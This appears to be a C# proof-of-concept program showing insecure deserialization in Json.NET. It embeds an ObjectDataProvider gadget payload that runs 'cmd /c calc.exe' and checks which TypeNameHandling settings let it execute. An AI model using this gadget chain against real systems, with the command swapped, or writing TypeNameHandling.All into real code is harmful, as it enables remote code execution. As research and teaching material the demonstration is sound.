using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Newtonsoft.Json;

namespace NewtonSoft.DeserializationExploit
{
    class Program
    {
        // Legit json that does what is expected of it, deserialize a model object
        static readonly string MODEL_LEGIT = @"{
                'Stuff':true,
                'Name':'Pelle Ponny',
                'Payload':null
        }";

        // Bad json that when deserialized starts a new calculator process
        static readonly string POP_CALC = @"{
                '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
                'MethodName':'Start',
                    'MethodParameters':{
                        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                        '$values':['cmd', '/c calc.exe']
                    },
                'ObjectInstance':{ '$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}";

        static string POP_CALC_WRAPPED = string.Format("{0}'Stuff':true,'Name':'Pelle Ponny','Payload':{1} {2}", "{", POP_CALC, "}");


        private static void Legit()
        {
            Model model = JsonConvert.DeserializeObject<Model>(MODEL_LEGIT, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });            
        }
                
        private static void GenCalcPayload()
        {
            // Exploit works
            Exploit(TypeNameHandling.All);

            // Exploit works
            Exploit(TypeNameHandling.Auto);

            // Exploit works            
            Exploit(TypeNameHandling.Objects);

            // Exploit works
            Exploit(TypeNameHandling.Arrays);

            // Exploit Fails
            Exploit(TypeNameHandling.None);

            // Exploit Fails (JsonSerializerSettings is null, which is the default)
            Exploit();            
        }

        private static void Exploit()
        {
            try
            {
                Model model1 = JsonConvert.DeserializeObject<Model>(POP_CALC_WRAPPED);
            }
            catch (Exception)
            {
            }
        }
        private static void Exploit(TypeNameHandling handling)
        {
            try
            {
                Model model1 = JsonConvert.DeserializeObject<Model>(POP_CALC_WRAPPED, new JsonSerializerSettings { TypeNameHandling = handling });
            }
            catch (Exception)
            {
            }            
        }

        static void Main(string[] args)
        {
            Legit();

            GenCalcPayload();            
        }        
    }
}
